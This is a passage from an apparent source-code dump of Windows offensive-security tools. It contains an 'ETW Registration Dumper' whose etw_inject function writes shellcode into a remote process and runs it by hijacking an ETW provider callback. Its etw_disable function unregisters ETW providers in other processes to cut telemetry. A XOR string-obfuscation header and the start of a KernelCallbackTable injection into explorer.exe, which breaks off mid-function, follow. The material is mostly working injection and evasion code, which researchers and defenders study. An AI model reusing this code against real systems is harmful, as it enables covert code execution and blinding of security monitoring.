    SymSetOptions(SYMOPT_DEFERRED_LOADS);
    SymInitialize(hp, NULL, TRUE);
    
    if(SymGetSearchPath(hp, path, MAX_PATH)) {
      printf("Search path for symbols : %s\n", path);
    }
    
    // read EtwpRegistrationTable into memory
    ReadProcessMemory(
      hp, (PBYTE)etw, (PBYTE)&tree, 
      sizeof(RTL_RB_TREE), &rd);
    
    wprintf(L"*********************************************\n");
    wprintf(L"  [ EtwpRegistrationTable for %ws:%i found at %p\n\n", 
      pe32->szExeFile, pe32->th32ProcessID, etw);
      
    // dump nodes
    etw_dump_nodes(hp, tree.Root, dll, opt, 0);
    
    SymCleanup(hp);
}

// read the VA of ETW registration table in NTDLL data section
LPVOID etw_get_table_va(VOID) {
    LPVOID                m, va = NULL;
    PIMAGE_DOS_HEADER     dos;
    PIMAGE_NT_HEADERS     nt;
    PIMAGE_SECTION_HEADER sh;
    DWORD                 i, cnt;
    PULONG_PTR            ds;
    PRTL_RB_TREE          rbt;
    PETW_USER_REG_ENTRY   re;
    
    m   = GetModuleHandle(L"ntdll.dll");
    dos = (PIMAGE_DOS_HEADER)m;  
    nt  = RVA2VA(PIMAGE_NT_HEADERS, m, dos->e_lfanew);  
    sh  = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + 
            nt->FileHeader.SizeOfOptionalHeader);
    
    // locate the .data segment, save VA and number of pointers
    for(i=0; i<nt->FileHeader.NumberOfSections; i++) {
      if(*(PDWORD)sh[i].Name == *(PDWORD)".data") {
        ds  = RVA2VA(PULONG_PTR, m, sh[i].VirtualAddress);
        cnt = sh[i].Misc.VirtualSize / sizeof(ULONG_PTR);
        break;
      }
    }
    
    // For each pointer minus one
    for(i=0; i<cnt - 1; i++) {
      rbt = (PRTL_RB_TREE)&ds[i];
      // Skip pointers that aren't heap memory
      if(!IsHeapPtr(rbt->Root)) continue;
      
      // It might be the registration table.
      // Check if the callback is code
      re = (PETW_USER_REG_ENTRY)rbt->Root;
      if(!IsCodePtr(re->Callback)) continue;
      
      // Save the virtual address and exit loop
      va = &ds[i];
      break;
    }
    return va;
}

// search for a provider in a process
PRTL_BALANCED_NODE etw_get_reg(
    HANDLE              hp, 
    LPVOID              etw, 
    PWCHAR              prov, 
    PETW_USER_REG_ENTRY re) 
{
    RTL_RB_TREE        tree;
    SIZE_T             rd;
    PRTL_BALANCED_NODE node;
    int                cmp;
    GUID               id;
    HRESULT            hr;
    
    hr = IIDFromString(prov, &id);
    if(hr != S_OK) {
      xstrerror(L"IIDFromString(%s)", prov);
      return NULL;
    }
    
    // read EtwpRegistrationTable into memory
    ReadProcessMemory(
      hp, (PBYTE)etw, (PBYTE)&tree, 
      sizeof(RTL_RB_TREE), &rd);
    
    node = tree.Root;
    
    while(node != NULL) {
      // read registration entry
      ReadProcessMemory(
        hp, (PBYTE)node, re, 
        sizeof(ETW_USER_REG_ENTRY), 
        &rd);
      
      // compare provider ids
      cmp = memcmp(&id, &re->ProviderId, sizeof(GUID));
      
      // equal?
      if(cmp == 0) {
        break;
      } else if(cmp < 0) {
        node = re->RegList.Children[0];
      } else {
        node = re->RegList.Children[1];
      }
    }
    return node;
}

// inject shellcode into process using ETW registration entry
BOOL etw_inject(DWORD pid, PWCHAR path, PWCHAR prov) {
    RTL_RB_TREE             tree;
    PVOID                   etw, pdata, cs, callback;
    HANDLE                  hp;
    SIZE_T                  rd, wr;
    ETW_USER_REG_ENTRY      re;
    PRTL_BALANCED_NODE      node;
    OLECHAR                 id[40];
    TRACEHANDLE             ht;
    DWORD                   plen, bufferSize;
    PWCHAR                  name;
    PEVENT_TRACE_PROPERTIES prop;
    BOOL                    status = FALSE;
    const wchar_t           etwname[]=L"etw_injection\0";
    
    if(path == NULL) return FALSE;
    
    // try read shellcode into memory
    plen = readpic(path, &pdata);
    if(plen == 0) { 
      wprintf(L"  [ ERROR: Unable to read shellcode from %s\n", path); 
      return FALSE; 
    }
    
    // try obtain the VA of ETW registration table
    etw = etw_get_table_va();
    
    if(etw == NULL) {
      wprintf(L"  [ ERROR: Unable to obtain address of ETW Registration Table.\n");
      return FALSE;
    }
    
    wprintf(L"*********************************************\n");
    wprintf(L"  [ The EtwpRegistrationTable in %s:%i was found at %p\n\n", 
      pid2name(pid), pid, etw);
    
    // try open target process
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    
    if(hp == NULL) {
      xstrerror(L"OpenProcess(%ld)", pid);
      return FALSE;
    }
    
    // use (Microsoft-Windows-User-Diagnostic) unless specified
    
    node = etw_get_reg(
      hp, 
      etw, 
      prov != NULL ? prov : L"{305FC87B-002A-5E26-D297-60223012CA9C}", 
      &re);
    
    if(node != NULL) {
      // convert GUID to string and display name
      StringFromGUID2(&re.ProviderId, id, sizeof(id));
      name = etw_id2name(id);
        
      wprintf(L"  [ Address of remote node  : %p\n", (PVOID)node);
      wprintf(L"  [ Using %s (%s)\n", id, name);
      
      // allocate memory for shellcode
      cs = VirtualAllocEx(
        hp, NULL, plen, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE);
        
      if(cs != NULL) {
        wprintf(L"  [ Address of old callback : %p\n", re.Callback);
        wprintf(L"  [ Address of new callback : %p\n", cs);
        
        // write shellcode
        WriteProcessMemory(hp, cs, pdata, plen, &wr);
          
        // initialize trace
        bufferSize = sizeof(EVENT_TRACE_PROPERTIES) + 
                     sizeof(etwname) + 2;

        prop = (EVENT_TRACE_PROPERTIES*)LocalAlloc(LPTR, bufferSize);
        prop->Wnode.BufferSize    = bufferSize;
        prop->Wnode.ClientContext = 2;
        prop->Wnode.Flags         = WNODE_FLAG_TRACED_GUID;
        prop->LogFileMode         = EVENT_TRACE_REAL_TIME_MODE;
        prop->LogFileNameOffset   = 0;
        prop->LoggerNameOffset    = sizeof(EVENT_TRACE_PROPERTIES);
        
        if(StartTrace(&ht, etwname, prop) == ERROR_SUCCESS) {
          // save callback
          callback = re.Callback;
          re.Callback = cs;
          
          // overwrite existing entry with shellcode address
          WriteProcessMemory(hp, 
            (PBYTE)node + offsetof(ETW_USER_REG_ENTRY, Callback), 
            &cs, sizeof(ULONG_PTR), &wr);
          
          // trigger execution of shellcode by enabling trace
          if(EnableTraceEx(
            &re.ProviderId, NULL, ht,
            1, TRACE_LEVEL_VERBOSE, 
            (1 << 16), 0, 0, NULL) == ERROR_SUCCESS) 
          {
            status = TRUE;
          }
          
          // restore callback
          WriteProcessMemory(hp, 
            (PBYTE)node + offsetof(ETW_USER_REG_ENTRY, Callback), 
            &callback, sizeof(ULONG_PTR), &wr);

          // disable tracing
          ControlTrace(ht, etwname, prop, EVENT_TRACE_CONTROL_STOP);
        } else {
          xstrerror(L"StartTrace");
        }
        LocalFree(prop);
        VirtualFreeEx(hp, cs, 0,  MEM_RELEASE);
      }        
    } else {
      wprintf(L"  [ ERROR: Unable to get registration entry.\n");
    }
    CloseHandle(hp);
    return status;
}

typedef NTSTATUS (NTAPI *RtlCreateUserThread_t) (
    IN  HANDLE ProcessHandle,
    IN  PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
    IN  BOOLEAN CreateSuspended,
    IN  ULONG StackZeroBits,
    IN  OUT  PULONG StackReserved,
    IN  OUT  PULONG StackCommit,
    IN  PVOID StartAddress,
    IN  PVOID StartParameter OPTIONAL,
    OUT PHANDLE ThreadHandle,
    OUT PCLIENT_ID ClientID);

typedef ULONG (WINAPI *EventUnregister_t)(REGHANDLE RegHandle);

typedef struct _disable_ctx {
    REGHANDLE         RegHandle;
    EventUnregister_t EventUnregister;
    ULONG             Result;
} disable_ctx;
  
// disable ETW provider using code stub
DWORD WINAPI DisableStub(LPVOID lpParameter) {
    disable_ctx *ctx;
    
    ctx = (disable_ctx*)lpParameter;
    
    // unregister the provider
    ctx->Result = ctx->EventUnregister(ctx->RegHandle);
    return 0;
}

int DisableStubEnd(int a, int b) { return a + b; }

BOOL etw_disable(
    HANDLE             hp,
    PRTL_BALANCED_NODE node,
    USHORT             index) 
{
    HMODULE               m;
    HANDLE                ht;
    RtlCreateUserThread_t pRtlCreateUserThread;
    CLIENT_ID             cid;
    NTSTATUS              nt=~0UL;
    REGHANDLE             RegHandle;
    EventUnregister_t     pEtwEventUnregister;
    ULONG                 Result;
    
    // resolve address of API for creating new thread
    m = GetModuleHandle(L"ntdll.dll");
    
    pRtlCreateUserThread = (RtlCreateUserThread_t)
        GetProcAddress(m, "RtlCreateUserThread");
        
    pEtwEventUnregister = (EventUnregister_t)
        GetProcAddress(m, "EtwEventUnregister");
    
    // create registration handle    
    RegHandle           = (REGHANDLE)((ULONG64)node | (ULONG64)index << 48);

    // execute API in remote process
    printf("  [ Executing EventUnregister in remote process.\n");
    nt = pRtlCreateUserThread(hp, NULL, FALSE, 0, NULL, 
      NULL, pEtwEventUnregister, (PVOID)RegHandle, &ht, &cid);

    printf("  [ NTSTATUS is %lx\n", nt);
    WaitForSingleObject(ht, INFINITE);
    
    // read result of EtwEventUnregister
    GetExitCodeThread(ht, &Result);
    CloseHandle(ht);
    
    SetLastError(Result);
    
    if(Result != ERROR_SUCCESS) {
      xstrerror(L"etw_disable");
      return FALSE;
    }
    disabled_cnt++; 
    return TRUE;
}

// search system for providers. 
// filter by process id, dll or provider id
VOID etw_search_system(DWORD pid, PWCHAR dll, PWCHAR prov, int opt) {
    HANDLE             ss;
    PROCESSENTRY32     pe;
    HANDLE             hp;
    ULONG_PTR          ptr;
    SIZE_T             rd;
    LPVOID             etw;
    ETW_USER_REG_ENTRY re;
    PRTL_BALANCED_NODE node;
    
    etw = etw_get_table_va();
    
    if(etw == NULL) {
      wprintf(L"  [ ERROR: Unable to resolve address of ETW registration table.\n");
      return;
    }
    
    ss = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(ss == INVALID_HANDLE_VALUE) return;
    
    pe.dwSize = sizeof(PROCESSENTRY32);

    if(Process32First(ss, &pe)){
      do {
        // skip system
        if(pe.th32ProcessID <= 4) continue;
        
        // if filtering by process id, skip entries that don't match
        if(pid != 0 && pe.th32ProcessID != pid) continue;
        
        // try open process
        hp = OpenProcess(
          PROCESS_ALL_ACCESS, 
          FALSE, 
          pe.th32ProcessID);
          
        if(hp != NULL) {
          // filter by provider?
          if(prov != NULL) {
            // try read registration entry from process
            node = etw_get_reg(hp, etw, prov, &re);
            if(node != NULL) {
              wprintf(L"*********************************************\n");
              wprintf(L"  [ Provider found in %ws:%i at %p\n\n", 
                pe.szExeFile, pe.th32ProcessID, (LPVOID)node);
      
              // show contents of it
              etw_reg_info(hp, node, &re, 0);
              // disable it?
              if(opt & ETW_OPT_DISABLE) {
                wprintf(L"  [ Tracing disabled: %s\n",
                  etw_disable(hp, node, re.RegIndex) ? L"OK" : L"FAILED");
              }
            }
          } else {
            etw_search_process(hp, &pe, etw, dll, opt);
          }
          CloseHandle(hp);
        } else {
          xstrerror(L"%s:%i", pe.szExeFile, pe.th32ProcessID);
        }
      } while(Process32Next(ss, &pe));
    }
    CloseHandle(ss);
}

/* 45d8cccd-539f-4b72-a8b7-5c683142609a */

GUID ALPCGuid = { 0x45d8cccd, 0x539f, 0x4b72, 0xa8, 0xb7, 0x5c, 0x68, 0x31, 0x42, 0x60, 0x9a };

typedef struct _EVENT_CALLBACK_ENTRY {
    LIST_ENTRY ListHead;
    GUID       ProviderId;
    PVOID      Callback;
} EVENT_CALLBACK_ENTRY, *PEVENT_CALLBACK_ENTRY;

void PeventCallback(PEVENT_TRACE pEvent) {
}

PWCHAR get_mapped_file(HANDLE hp, PVOID address) {
    static WCHAR path[MAX_PATH];
    ZeroMemory(path, sizeof(path));
    
    GetMappedFileName(hp, address, path, MAX_PATH);
    return path;
}

PVOID GetTraceCallbackList(VOID) {
    PIMAGE_DOS_HEADER     dos;
    PIMAGE_NT_HEADERS     nt;
    PIMAGE_SECTION_HEADER sh;
    HMODULE               m;
    BOOL                  found = FALSE;
    DWORD                 i, cnt;
    PULONG_PTR            ds;
    PEVENT_CALLBACK_ENTRY pce;

    // install our callback
    SetTraceCallback(&ALPCGuid, PeventCallback);
    
    // now try find in list
    m   = LoadLibrary(L"sechost");
    dos = (PIMAGE_DOS_HEADER)m;  
    nt  = RVA2VA(PIMAGE_NT_HEADERS, m, dos->e_lfanew);  
    sh  = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + 
            nt->FileHeader.SizeOfOptionalHeader);
    
    // locate the .data segment, save VA and number of pointers
    for(i=0; i<nt->FileHeader.NumberOfSections; i++) {
      if(*(PDWORD)sh[i].Name == *(PDWORD)".data") {
        ds  = RVA2VA(PULONG_PTR, m, sh[i].VirtualAddress);
        cnt = sh[i].Misc.VirtualSize / sizeof(ULONG_PTR);
        break;
      }
    }
    
    // Find handler in section
    for(i=0; i<cnt - 1; i++) {
      if(!IsHeapPtr((PVOID)ds[i])) continue;
      pce = (PEVENT_CALLBACK_ENTRY)ds[i];
      if(pce->Callback != PeventCallback) continue;
      found = TRUE;
      break;
    }
    
    RemoveTraceCallback(&ALPCGuid);
    
    // if found, return the pointer to list
    return found ? &ds[i] : NULL;   
}

void dump_tracers(HANDLE hp, PVOID va, DWORD pid, PWCHAR proc) {
    LIST_ENTRY           ecl;
    EVENT_CALLBACK_ENTRY ece;
    PVOID                ptr;
    SIZE_T               rd;
    OLECHAR              id[40];
    
    // read list entry
    ReadProcessMemory(
      hp, va, &ecl, 
      sizeof(ecl), &rd);
    
    if(rd != sizeof(ecl)) return;
    
    ptr = ecl.Flink;
    if(ptr == va) return;
    
    printf("TraceCallbackList : %p : %ws [%i]\n", va, proc, pid);

    for(;;) {
      if(ptr == va) break;
      
      ReadProcessMemory(
        hp, ptr, &ece, 
        sizeof(ece), &rd);
      
      if(rd != sizeof(ece)) break;
      
      StringFromGUID2(&ece.ProviderId, id, sizeof(id));
      printf("ProviderId : %ws (%ws)\n", id, etw_id2name(id));
      
      ptr = ece.Callback;
      printf("Callback   : %p : %ws\n", ptr, get_mapped_file(hp, ptr)); 
    
      ptr = (PVOID)ece.ListHead.Flink;
    }
    putchar('\n');
}

void scan_tracers(DWORD pid) {
    HANDLE         ss;
    PROCESSENTRY32 pe;
    HANDLE         hp;
    PVOID          va;
    
    va = GetTraceCallbackList();
    
    ss = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(ss == INVALID_HANDLE_VALUE) return;
    
    pe.dwSize = sizeof(PROCESSENTRY32);

    if(Process32First(ss, &pe)){
      do {
        // skip system
        if(pe.th32ProcessID <= 4) continue;
        
        // if filtering by process id, skip entries that don't match
        if(pid != 0 && pe.th32ProcessID != pid) continue;
        
        // try open process
        hp = OpenProcess(
          PROCESS_ALL_ACCESS, 
          FALSE, 
          pe.th32ProcessID);
          
        if(hp != NULL) {
          dump_tracers(hp, va, pe.th32ProcessID, pe.szExeFile);
          
          CloseHandle(hp);
        }
      } while(Process32Next(ss, &pe));
    }
    CloseHandle(ss);
}

void usage(void) {
    wprintf(L"usage: etwdump [options] <process>\n\n");
    wprintf(L"  -i <file>    Inject shellcode into remote process (must use same prototype as ETW callback)\n");
    wprintf(L"  -d           Disable providers.\n");
    wprintf(L"  -m <dll>     Filter by DLL.\n");
    wprintf(L"  -p <guid>    Filter by provider.\n");
    putchar('\n');
    
    exit(0);
}

int wmain(int argc, WCHAR *argv[]) {
    WCHAR   *prov = NULL, 
            *file = NULL, 
            *dll = NULL, 
            *process = NULL;
    int     i, pid=0, opt = ETW_OPT_SEARCH;
    
    puts("\n  [ ETW Registration Dumper. Copyright (c) Odzhan\n");
    
    for(i=1; i<=argc-1; i++) {
      // is this a switch?
      if(argv[i][0]==L'/' || argv[i][0]==L'-'){
        // check it out
        switch(argv[i][1]) {
          // try disable provider?
          case L'd':
            opt |= ETW_OPT_DISABLE;
            break;
          // inject code?
          case L'i':
            opt |= ETW_OPT_INJECT;
            file = argv[++i];
            break;
          // search process
          case L's':
            opt |= ETW_OPT_SEARCH;
            break;
          // filter by provider id
          case L'p':
            prov = argv[++i];
            break;
          // filter by module/DLL
          case L'm':
            dll = argv[++i];
            break;
          // list tracers
          case L't':
            opt |= ETW_OPT_TRACERS;
            break;
          // help
          case L'?':
          case L'h':
          default:
            usage();
            break;
        }
      } else if (process==NULL) {
        process = argv[i];
      }
    }

    // target process specified?
    if(process != NULL) {
      pid = name2pid(process);
      if(pid == 0) pid = wcstoull(process, NULL, 10);
      if(pid == 0) {
        wprintf(L"  [ ERROR: Unable to resolve pid for \"%s\".\n", process);
        return -1;
      }
    }
    // injection specified, but no file or target process supplied?
    if ((opt & ETW_OPT_INJECT) && (file == NULL || pid == 0)) {
      wprintf(L"  [ ERROR: No shellcode or process specified for injection.\n");
      return 0;
    }
    
    // try enable debug privilege
    if(!SetPrivilege(SE_DEBUG_NAME, TRUE)) {
      wprintf(L"  [ WARNING: Failed to enable debugging privilege.\n");
    }
    
    // inject code?
    if(opt & ETW_OPT_INJECT) {
      wprintf(L"  [ STATUS: %s.\n", 
        etw_inject(pid, file, prov) ? L"complete" : L"failed");
    } else {
      // perform a search or disable providers
      etw_search_system(pid, dll, prov, opt);
      
      wprintf(L"  [ Found %i providers that meet your criteria.\n", prov_cnt);
    }
    return 0;
}

```

`extrabytes/Makefile`:

```
extrabytes:
	cl /nologo /MD extrabytes.c
clean:
	del extrabytes.exe *.obj
```

`extrabytes/Makefile.msvc`:

```msvc
all:
	cl extract.cpp
	cl /Os /O2 /GS- /Gy messagebox.cpp
	extract messagebox.exe .text messagebox.bin
```

`extrabytes/xorstring.h`:

```h

#ifndef XORSTRING_H
#define XORSTRING_H

#include <iostream>

// =============================================================================
namespace crypt {
// =============================================================================

// convert __TIME__ == "hh:mm:ss" to a sum of seconds this gives us a compile-time seed
// Note: in some weird cases I've seen the seed being different from encryption
// to decryption so it's safer to not use time and set the seed manually
#if 0
#define TBX_XSTR_SEED ((__TIME__[7] - '0') * 1ull    + (__TIME__[6] - '0') * 10ull  + \
                       (__TIME__[4] - '0') * 60ull   + (__TIME__[3] - '0') * 600ull + \
                       (__TIME__[1] - '0') * 3600ull + (__TIME__[0] - '0') * 36000ull)
#else
#define TBX_XSTR_SEED (3600ull)
#endif

// -----------------------------------------------------------------------------

// @return a pseudo random number clamped at 0xFFFFFFFF
constexpr unsigned long long linear_congruent_generator(unsigned rounds) {
    return 1013904223ull + (1664525ull * ((rounds> 0) ? linear_congruent_generator(rounds - 1) : (TBX_XSTR_SEED) )) % 0xFFFFFFFF;
}

// -----------------------------------------------------------------------------

#define Random() linear_congruent_generator(10)
#define XSTR_RANDOM_NUMBER(Min, Max) (Min + (Random() % (Max - Min + 1)))

// -----------------------------------------------------------------------------

constexpr const unsigned long long XORKEY = XSTR_RANDOM_NUMBER(0, 0xFF);

// -----------------------------------------------------------------------------

template<typename Char >
constexpr Char encrypt_character(const Char character, int index) {
    return character ^ (static_cast<Char>(XORKEY) + index);
}

// -----------------------------------------------------------------------------

template <unsigned size, typename Char>
class Xor_string {
public:
    const unsigned _nb_chars = (size - 1);
    Char _string[size];

    // if every goes alright this constructor should be executed at compile time
    inline constexpr Xor_string(const Char* string)
        : _string{}
    {
        for(unsigned i = 0u; i < size; ++i)
            _string[i] = encrypt_character<Char>(string[i], i);
    }

    // This is executed at runtime.
    // HACK: although decrypt() is const we modify '_string' in place
    const Char* decrypt() const
    {
        Char* string = const_cast<Char*>(_string);
        for(unsigned t = 0; t < _nb_chars; t++) {
            string[t] = string[t] ^ (static_cast<Char>(XORKEY) + t);
        }
        string[_nb_chars] = '\0';
        return string;
    }

};

}// END crypt NAMESPACE ========================================================

#define XorS(name, my_string)    constexpr crypt::Xor_string<(sizeof(my_string)/sizeof(char)), char> name(my_string)
// Because of a limitation/bug in msvc 2017 we need to declare crypt::Xor_string() as a constexpr 
// otherwise the constructor is not evaluated at compile time. The lambda function is here to allow this declaration inside the macro
// because there is no such thing as casting to 'constexpr' (and casting to const does not solve this bug).
#define XorString(my_string) []{ constexpr crypt::Xor_string<(sizeof(my_string)/sizeof(char)), char> expr(my_string); return expr; }().decrypt()

// Crypt normal string char*
#define _c( string ) XorString( string )

#define XorWS(name, my_string)       constexpr crypt::Xor_string<(sizeof(my_string)/sizeof(wchar_t)), wchar_t> name(my_string)
#define XorWideString(my_string) []{ constexpr crypt::Xor_string<(sizeof(my_string)/sizeof(wchar_t)), wchar_t> expr(my_string); return expr; }().decrypt()

// crypt  wide characters
#define _cw( string ) XorWideString( string )

#endif

```

`kct/kct.c`:

```c
/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#define UNICODE
#include "../ntlib/ntddk.h"
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")

// user32.dll!apfnDispatch
typedef struct _KERNELCALLBACKTABLE_T {
    ULONG_PTR __fnCOPYDATA;
    ULONG_PTR __fnCOPYGLOBALDATA;
    ULONG_PTR __fnDWORD;
    ULONG_PTR __fnNCDESTROY;
    ULONG_PTR __fnDWORDOPTINLPMSG;
    ULONG_PTR __fnINOUTDRAG;
    ULONG_PTR __fnGETTEXTLENGTHS;
    ULONG_PTR __fnINCNTOUTSTRING;
    ULONG_PTR __fnPOUTLPINT;
    ULONG_PTR __fnINLPCOMPAREITEMSTRUCT;
    ULONG_PTR __fnINLPCREATESTRUCT;
    ULONG_PTR __fnINLPDELETEITEMSTRUCT;
    ULONG_PTR __fnINLPDRAWITEMSTRUCT;
    ULONG_PTR __fnPOPTINLPUINT;
    ULONG_PTR __fnPOPTINLPUINT2;
    ULONG_PTR __fnINLPMDICREATESTRUCT;
    ULONG_PTR __fnINOUTLPMEASUREITEMSTRUCT;
    ULONG_PTR __fnINLPWINDOWPOS;
    ULONG_PTR __fnINOUTLPPOINT5;
    ULONG_PTR __fnINOUTLPSCROLLINFO;
    ULONG_PTR __fnINOUTLPRECT;
    ULONG_PTR __fnINOUTNCCALCSIZE;
    ULONG_PTR __fnINOUTLPPOINT5_;
    ULONG_PTR __fnINPAINTCLIPBRD;
    ULONG_PTR __fnINSIZECLIPBRD;
    ULONG_PTR __fnINDESTROYCLIPBRD;
    ULONG_PTR __fnINSTRING;
    ULONG_PTR __fnINSTRINGNULL;
    ULONG_PTR __fnINDEVICECHANGE;
    ULONG_PTR __fnPOWERBROADCAST;
    ULONG_PTR __fnINLPUAHDRAWMENU;
    ULONG_PTR __fnOPTOUTLPDWORDOPTOUTLPDWORD;
    ULONG_PTR __fnOPTOUTLPDWORDOPTOUTLPDWORD_;
    ULONG_PTR __fnOUTDWORDINDWORD;
    ULONG_PTR __fnOUTLPRECT;
    ULONG_PTR __fnOUTSTRING;
    ULONG_PTR __fnPOPTINLPUINT3;
    ULONG_PTR __fnPOUTLPINT2;
    ULONG_PTR __fnSENTDDEMSG;
    ULONG_PTR __fnINOUTSTYLECHANGE;
    ULONG_PTR __fnHkINDWORD;
    ULONG_PTR __fnHkINLPCBTACTIVATESTRUCT;
    ULONG_PTR __fnHkINLPCBTCREATESTRUCT;
    ULONG_PTR __fnHkINLPDEBUGHOOKSTRUCT;
    ULONG_PTR __fnHkINLPMOUSEHOOKSTRUCTEX;
    ULONG_PTR __fnHkINLPKBDLLHOOKSTRUCT;
    ULONG_PTR __fnHkINLPMSLLHOOKSTRUCT;
    ULONG_PTR __fnHkINLPMSG;
    ULONG_PTR __fnHkINLPRECT;
    ULONG_PTR __fnHkOPTINLPEVENTMSG;
    ULONG_PTR __xxxClientCallDelegateThread;
    ULONG_PTR __ClientCallDummyCallback;
    ULONG_PTR __fnKEYBOARDCORRECTIONCALLOUT;
    ULONG_PTR __fnOUTLPCOMBOBOXINFO;
    ULONG_PTR __fnINLPCOMPAREITEMSTRUCT2;
    ULONG_PTR __xxxClientCallDevCallbackCapture;
    ULONG_PTR __xxxClientCallDitThread;
    ULONG_PTR __xxxClientEnableMMCSS;
    ULONG_PTR __xxxClientUpdateDpi;
    ULONG_PTR __xxxClientExpandStringW;
    ULONG_PTR __ClientCopyDDEIn1;
    ULONG_PTR __ClientCopyDDEIn2;
    ULONG_PTR __ClientCopyDDEOut1;
    ULONG_PTR __ClientCopyDDEOut2;
    ULONG_PTR __ClientCopyImage;
    ULONG_PTR __ClientEventCallback;
    ULONG_PTR __ClientFindMnemChar;
    ULONG_PTR __ClientFreeDDEHandle;
    ULONG_PTR __ClientFreeLibrary;
    ULONG_PTR __ClientGetCharsetInfo;
    ULONG_PTR __ClientGetDDEFlags;
    ULONG_PTR __ClientGetDDEHookData;
    ULONG_PTR __ClientGetListboxString;
    ULONG_PTR __ClientGetMessageMPH;
    ULONG_PTR __ClientLoadImage;
    ULONG_PTR __ClientLoadLibrary;
    ULONG_PTR __ClientLoadMenu;
    ULONG_PTR __ClientLoadLocalT1Fonts;
    ULONG_PTR __ClientPSMTextOut;
    ULONG_PTR __ClientLpkDrawTextEx;
    ULONG_PTR __ClientExtTextOutW;
    ULONG_PTR __ClientGetTextExtentPointW;
    ULONG_PTR __ClientCharToWchar;
    ULONG_PTR __ClientAddFontResourceW;
    ULONG_PTR __ClientThreadSetup;
    ULONG_PTR __ClientDeliverUserApc;
    ULONG_PTR __ClientNoMemoryPopup;
    ULONG_PTR __ClientMonitorEnumProc;
    ULONG_PTR __ClientCallWinEventProc;
    ULONG_PTR __ClientWaitMessageExMPH;
    ULONG_PTR __ClientWOWGetProcModule;
    ULONG_PTR __ClientWOWTask16SchedNotify;
    ULONG_PTR __ClientImmLoadLayout;
    ULONG_PTR __ClientImmProcessKey;
    ULONG_PTR __fnIMECONTROL;
    ULONG_PTR __fnINWPARAMDBCSCHAR;
    ULONG_PTR __fnGETTEXTLENGTHS2;
    ULONG_PTR __fnINLPKDRAWSWITCHWND;
    ULONG_PTR __ClientLoadStringW;
    ULONG_PTR __ClientLoadOLE;
    ULONG_PTR __ClientRegisterDragDrop;
    ULONG_PTR __ClientRevokeDragDrop;
    ULONG_PTR __fnINOUTMENUGETOBJECT;
    ULONG_PTR __ClientPrinterThunk;
    ULONG_PTR __fnOUTLPCOMBOBOXINFO2;
    ULONG_PTR __fnOUTLPSCROLLBARINFO;
    ULONG_PTR __fnINLPUAHDRAWMENU2;
    ULONG_PTR __fnINLPUAHDRAWMENUITEM;
    ULONG_PTR __fnINLPUAHDRAWMENU3;
    ULONG_PTR __fnINOUTLPUAHMEASUREMENUITEM;
    ULONG_PTR __fnINLPUAHDRAWMENU4;
    ULONG_PTR __fnOUTLPTITLEBARINFOEX;
    ULONG_PTR __fnTOUCH;
    ULONG_PTR __fnGESTURE;
    ULONG_PTR __fnPOPTINLPUINT4;
    ULONG_PTR __fnPOPTINLPUINT5;
    ULONG_PTR __xxxClientCallDefaultInputHandler;
    ULONG_PTR __fnEMPTY;
    ULONG_PTR __ClientRimDevCallback;
    ULONG_PTR __xxxClientCallMinTouchHitTestingCallback;
    ULONG_PTR __ClientCallLocalMouseHooks;
    ULONG_PTR __xxxClientBroadcastThemeChange;
    ULONG_PTR __xxxClientCallDevCallbackSimple;
    ULONG_PTR __xxxClientAllocWindowClassExtraBytes;
    ULONG_PTR __xxxClientFreeWindowClassExtraBytes;
    ULONG_PTR __fnGETWINDOWDATA;
    ULONG_PTR __fnINOUTSTYLECHANGE2;
    ULONG_PTR __fnHkINLPMOUSEHOOKSTRUCTEX2;
} KERNELCALLBACKTABLE;

VOID kernelcallbacktable(LPVOID payload, DWORD payloadSize) {
    HANDLE                    hp;
    HWND                      hw;
    DWORD                     id;
    LPVOID                    cs, ds;
    SIZE_T                    wr, rd;
    PROCESS_BASIC_INFORMATION pbi;
    PEB                       peb;
    KERNELCALLBACKTABLE       kct;
    COPYDATASTRUCT            cds;
    WCHAR                     msg[]=L"Injection via KernelCallbackTable";
    
    // 1. Find a window for explorer.exe
    //    Obtain the process id and open it
    hw = FindWindow(L"Shell_TrayWnd", NULL);
    GetWindowThreadProcessId(hw, &id);
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);

    // 2. Read the PEB and existing table address
    NtQueryInformationProcess(hp, 
      ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
    
    ReadProcessMemory(hp, pbi.PebBaseAddress, 
      &peb, sizeof(peb), &rd);
      
    ReadProcessMemory(hp, peb.KernelCallbackTable,
      &kct, sizeof(kct), &rd);
    
    // 3. Write the payload to remote process
    cs = VirtualAllocEx(hp, NULL, payloadSize,
